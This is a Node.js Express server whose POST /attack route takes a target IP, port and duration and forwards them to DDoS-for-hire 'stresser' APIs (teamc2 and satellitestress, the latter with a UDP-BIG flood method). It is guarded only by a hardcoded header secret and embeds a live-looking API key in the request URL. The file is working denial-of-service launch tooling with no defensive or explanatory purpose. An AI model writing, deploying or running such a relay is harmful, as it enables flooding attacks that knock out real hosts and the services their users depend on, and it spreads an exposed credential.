// ================= 🔥 GLOBAL ERROR DEBUG =================
process.on("uncaughtException", err => {
  console.error("🔥 UNCAUGHT EXCEPTION:", err);
});

process.on("unhandledRejection", err => {
  console.error("🔥 UNHANDLED PROMISE:", err);
});

// ================= IMPORTS =================
const express = require("express");
const axios = require("axios");
const cors = require("cors");
const https = require("https");

const app = express();

app.use(cors());
app.use(express.json());

// ================= ENV =================
const API_KEY = process.env.API_KEY;
const PORT = process.env.PORT;
const MODE = process.env.MODE || "teamc2";

console.log("MODE:", MODE);
console.log("API_KEY:", API_KEY ? "Loaded ✅" : "Missing ❌");

// ================= CONFIG =================

// ✅ Keep-alive agent
const agent = new https.Agent({
  keepAlive: true,
  maxSockets: 50
});

// ✅ Browser-like headers
const defaultHeaders = {
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "Accept": "application/json, text/plain, */*",
  "Accept-Language": "en-US,en;q=0.9",
  "Connection": "keep-alive"
};

// ✅ Common GET helper
async function httpGet(url) {
  const res = await axios.get(url, {
    timeout: 15000,
    httpsAgent: agent,
    headers: defaultHeaders,
    validateStatus: () => true // errors ko throw na kare
  });

  return {
    status: res.status,
    data: res.data
  };
}

// ================= ROUTES =================

app.get("/", (req, res) => res.status(200).send("OK"));

app.post("/attack", async (req, res) => {
  try {
    console.log("➡️ Incoming request");

    // 🔐 basic security
    if (req.headers["x-sec"] !== "9xK3pL") {
      return res.status(403).json({ error: "Forbidden" });
    }

    let { ip, port, time } = req.body;

    if (!ip || !port || !time) {
      return res.status(400).json({ error: "Missing params" });
    }

    port = Number(port);
    time = Number(time);

    if (isNaN(port) || isNaN(time)) {
      return res.status(400).json({ error: "Invalid port/time" });
    }

    const safeIp = encodeURIComponent(ip);

    let responseData;

    // ================= 🔥 TEAMC2 =================
    if (MODE === "teamc2") {
      if (!API_KEY) {
        return res.status(500).json({ error: "API key missing" });
      }

      const url = `https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1`;

      console.log("🌐 TEAMC2");

      const r = await httpGet(url);

      console.log("📦 TEAMC2:", r.status, r.data);

      if (r.status >= 400) {
        return res.status(r.status).json({
          success: false,
          error: r.data || `HTTP ${r.status}`
        });
      }

      responseData = r.data;
    }

    // ================= 🔥 CAT =================
    else if (MODE === "cat") {
      console.log("🌐 CAT");

      const url = `https://satellitestress.st/api/v1/attack/start?key=sk_live_2003892d0f07f1bf1dae6fcef33678b73d0fdac68dcf0f3e71f1873de9b2a705&host=${ip}&port=${port}&time=${time}&method=UDP-BIG`;

      const r = await httpGet(url);

      console.log("📦 CAT:", r.status, r.data);

      if (r.status >= 400) {
        return res.status(r.status).json({
          success: false,
          error: r.data || `HTTP ${r.status}`
        });
      }

      responseData = r.data;
    }

    else {
      return res.status(400).json({ error: "Invalid mode" });
    }

    return res.json({
      success: true,
      data: responseData
    });

  } catch (err) {
    console.error("🔥 ERROR:", err.message || err);

    return res.status(500).json({
      success: false,
      error: err.message || "Server error"
    });
  }
});

// ================= START =================
if (!PORT) {
  console.error("❌ PORT missing");
  process.exit(1);
}

app.listen(PORT, () => {
  console.log(`🚀 Running on ${PORT}`);
});
